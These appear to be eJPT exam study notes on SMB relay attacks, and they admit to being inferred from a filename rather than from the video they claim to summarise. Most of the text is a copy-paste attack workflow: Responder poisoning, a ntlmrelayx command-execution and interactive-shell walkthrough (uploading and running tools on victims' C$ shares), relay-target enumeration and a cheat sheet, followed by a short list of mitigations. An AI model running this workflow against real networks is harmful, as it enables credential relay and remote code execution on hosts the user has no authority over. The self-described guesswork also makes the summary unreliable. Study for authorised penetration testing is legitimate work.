# 09 - SMB Relay Attack (eJPT Study Notes)

Note: The transcript was not provided. The following is a conservative, exam-focused summary inferred from the filename and typical eJPT “Network Attacks” content. Commands and flags reflect common practice for modern Kali/Parrot with Responder, Impacket, and CrackMapExec.

## What the video covers (Introduction / big picture)
- How NTLM authentication can be relayed over SMB when:
  - A victim authenticates to an attacker-controlled service (e.g., via LLMNR/NBT-NS/WPAD poisoning).
  - The relay target has SMB signing not required (i.e., message signing disabled or “enabled but not required”).
- Using Responder to coerce/capture inbound authentication and Impacket’s ntlmrelayx to relay to SMB and gain access/execute commands.
- Identifying relayable targets and a practical attack workflow.
- High-level defenses: enable SMB signing, disable LLMNR/NBT-NS/WPAD, harden SMB.

## Flow (ordered)
1. Scope/network check: ensure you are on the same L2 segment where LLMNR/NBT-NS poisoning works.
2. Identify SMB targets where message signing is not required.
3. Prepare Responder for relay (disable its SMB/HTTP servers so ntlmrelayx can handle them).
4. Start Responder to poison LLMNR/NBT-NS/WPAD.
5. Start ntlmrelayx pointing at relayable targets; choose command execution or interactive SMB shell.
6. Wait for victim authentication; on success, execute commands or enumerate shares.
7. Collect loot (hashes/files) and document impact.
8. Clean up and revert Responder config if modified.

## Tools highlighted
- Responder (LLMNR/NBT-NS/WPAD poisoning)
- Impacket ntlmrelayx (relay NTLM to SMB, command execution, interactive SMB shell)
- CrackMapExec (quickly enumerates SMB signing and produces a relay target list)
- Nmap (script-based check of SMB signing)
- Optional: tmux/screen for parallel command windows

## Typical command walkthrough (detailed, copy-paste friendly)

Set some variables for convenience:
```
IFACE=eth0
SUBNET=10.10.10.0/24
TARGETS=targets.txt
LOOT=loot
```

0) Prep: avoid port conflicts and find the right interface
```
# Stop local SMB services that might conflict with Responder
sudo systemctl stop smbd nmbd 2>/dev/null
sudo systemctl disable smbd nmbd 2>/dev/null

# Confirm your interface
ip -br a
```

1) Find relayable targets (SMB signing not required)

Option A – CrackMapExec (recommended quick path):
```
# This generates a list of hosts suitable for SMB relay (signing not required)
crackmapexec smb $SUBNET --gen-relay-list $TARGETS
cat $TARGETS
```

Option B – Nmap verification:
```
nmap -p445 --script smb2-security-mode $SUBNET -oN smb_signing_scan.nmap

# Look in the output for:
# "Message signing enabled but not required"  => relayable
# "Message signing required"                 => NOT relayable
```

2) Configure Responder for relay (disable SMB/HTTP so ntlmrelayx handles those)
```
# Backup config first
sudo cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak

# Turn off SMB and HTTP in Responder (so it won't "eat" the auth before relay)
sudo sed -i 's/^SMB.*/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP.*/HTTP = Off/' /etc/responder/Responder.conf

# (You can also edit manually: sudo nano /etc/responder/Responder.conf)
```

3) Start Responder to poison LLMNR/NBT-NS/WPAD
```
sudo responder -I $IFACE -rdw -v
# -I: interface
# -r: answer NetBIOS/LLMNR
# -d: enable/serve WPAD/DHCP options (depends on version)
# -w: start WPAD rogue proxy
# -v: verbose
```

4) Start ntlmrelayx to relay to SMB
- Command execution on target(s):
```
mkdir -p $LOOT
impacket-ntlmrelayx -tf $TARGETS -smb2support -c "whoami" -l $LOOT
```

- Interactive SMB shell on success:
```
mkdir -p $LOOT
impacket-ntlmrelayx -tf $TARGETS -smb2support -i -l $LOOT
```

- Single target variant:
```
impacket-ntlmrelayx -t smb://10.10.10.20 -smb2support -i -l $LOOT
```

5) Use the interactive SMB shell (if you used -i)
Common commands inside ntlmrelayx SMB shell:
```
# After a successful relay:
SMB> shares
SMB> use C$
SMB> ls
SMB> cd \Windows\Temp
SMB> put yourtool.exe
SMB> execute cmd.exe /c whoami > C:\Windows\Temp\who.txt
SMB> get C:\Windows\Temp\who.txt
SMB> exit
```

6) Notes on outcomes
- If the relayed user is local admin on the target, ntlmrelayx can often execute commands and/or dump goodies automatically into the loot directory.
- If not admin, you may still enumerate shares/files but lack code execution.

7) Cleanup and revert Responder config
```
# Stop Responder (Ctrl+C), then restore config if needed
sudo mv /etc/responder/Responder.conf.bak /etc/responder/Responder.conf 2>/dev/null || true
```

## Practical tips
- You must be on the same broadcast domain as the victim for LLMNR/NBT-NS poisoning to work.
- Relay only works if the relay target does not require SMB signing. Domain Controllers typically require signing by default; look for workstations/servers where it’s not required.
- Keep Responder’s SMB/HTTP OFF during relay; otherwise Responder will capture (and terminate) the handshake rather than forwarding it to ntlmrelayx.
- Run Responder and ntlmrelayx as root to bind low ports (80/445).
- Make sure no local services are occupying ports needed by Responder (smbd/nmbd/apache).
- Use tmux/split panes: one for Responder, one for ntlmrelayx, one for logs.
- If you get lots of noise but no hits, wait for users to browse network shares or trigger naming lookups, or consider safe coercion techniques only if allowed in scope.
- Common signs of success: ntlmrelayx prints “SMB connection successful” and shows command output or opens an SMB> prompt.

## Minimal cheat sheet (one-screen flow)
```
IFACE=eth0
SUBNET=10.10.10.0/24
TARGETS=targets.txt
LOOT=loot

# 1) Find relayable hosts
crackmapexec smb $SUBNET --gen-relay-list $TARGETS
cat $TARGETS

# 2) Prep Responder for relay
sudo cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak
sudo sed -i 's/^SMB.*/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP.*/HTTP = Off/' /etc/responder/Responder.conf

# 3) Start Responder
sudo responder -I $IFACE -rdw -v

# 4) Start ntlmrelayx (command exec) or interactive
mkdir -p $LOOT
impacket-ntlmrelayx -tf $TARGETS -smb2support -c "whoami" -l $LOOT
# or
impacket-ntlmrelayx -tf $TARGETS -smb2support -i -l $LOOT
```

## Summary
- SMB relay abuses NTLM authentication by capturing a victim’s network authentication and relaying it to an SMB service where signing is not required.
- Typical stack: Responder (to coerce/capture auth) + ntlmrelayx (to relay to SMB targets).
- Key prerequisite: target must not require SMB signing; enumerate first with CrackMapExec or Nmap.
- Workflow: identify targets → configure Responder for relay → run Responder → run ntlmrelayx → wait for victim → execute commands/enumerate shares → collect loot.
- Mitigations: enable SMB signing everywhere, disable LLMNR/NBT-NS/WPAD, restrict local admin rights, and segment networks.